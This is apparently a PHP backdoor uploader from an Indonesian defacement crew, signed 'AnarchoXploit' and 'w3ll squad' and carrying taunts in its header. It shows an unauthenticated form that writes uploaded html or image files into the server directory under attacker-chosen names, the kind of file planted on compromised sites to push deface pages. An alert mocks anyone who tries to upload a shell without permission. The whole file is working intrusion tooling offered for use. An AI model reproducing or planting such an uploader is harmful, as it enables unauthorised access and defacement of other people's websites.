<center>
	<h3>Ramdhani7 | AnarchoXploit| Buat apa gan pansos pansos bait sana sini soof sana sini biar di bilang pro gitu?? hhh "</h3><br>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<br>
<button name="gas">up!</button>
<?php

if(isset($_POST['gas'])){
	
	//copyright by botline
	//jangan ganti copyright
	//w3ll squad
	//uploader html

$nama = $_FILES['file']['name'];
$gagal = $_FILES['file']['error'];
   $tmp = $_FILES['file']['tmp_name'];
		
		$ext = ['html', 'jpg', 'jpeg', 'png'];
		$extg = explode('.', $nama);
		$extg = strtolower(end($extg));
		if ( !in_array($extg, $ext)) {
		  echo "<script>alert('MAU APLOD SHELL YA BILANG SATIYA GANS DOLOE')</script>";
		return false;
		}
	
	$up = move_uploaded_file($tmp, $nama);
	
	if ($up){
		echo "<br><br>sukses";
		}else{
		echo "<br><br>gagal";
		
	}
}
?>